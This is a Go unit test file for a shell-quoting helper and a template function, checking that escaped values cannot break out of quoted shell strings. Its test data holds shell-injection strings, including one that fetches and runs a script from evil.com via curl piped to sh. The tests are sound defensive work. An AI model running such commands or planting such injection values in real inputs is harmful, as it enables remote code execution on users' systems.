package common

import (
	"testing"
)

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "plain value",
			in:   "London",
			want: "'London'",
		},
		{
			name: "empty value",
			in:   "",
			want: "''",
		},
		{
			name: "value with spaces",
			in:   "New York",
			want: "'New York'",
		},
		{
			name: "single quote injection attempt",
			in:   "x'; curl evil.com/x.sh | sh #",
			want: `'x'\''; curl evil.com/x.sh | sh #'`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellQuote(tt.in)
			if got != tt.want {
				t.Errorf("shellQuote(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestShellQuoteBreaksOutOfNaiveWrapping documents, via ProcessTemplate
// itself, that a value passed through shellQuote cannot terminate the
// quoted string it's substituted into the way a bare, un-escaped
// substitution can.
func TestShellQuoteBreaksOutOfNaiveWrapping(t *testing.T) {
	malicious := "x'; touch /tmp/pwned #"

	naive, err := ProcessTemplate(`echo '{{ .value }}'`, map[string]interface{}{"value": malicious})
	if err != nil {
		t.Fatalf("ProcessTemplate (naive) error = %v", err)
	}
	wantNaive := `echo 'x'; touch /tmp/pwned #'`
	if naive != wantNaive {
		t.Fatalf("naive template result = %q, want %q (the point of this test is that the naive form IS broken)", naive, wantNaive)
	}

	quoted, err := ProcessTemplate(`echo {{ .value | shellQuote }}`, map[string]interface{}{"value": malicious})
	if err != nil {
		t.Fatalf("ProcessTemplate (shellQuote) error = %v", err)
	}
	wantQuoted := `echo 'x'\''; touch /tmp/pwned #'`
	if quoted != wantQuoted {
		t.Errorf("shellQuote template result = %q, want %q", quoted, wantQuoted)
	}
}
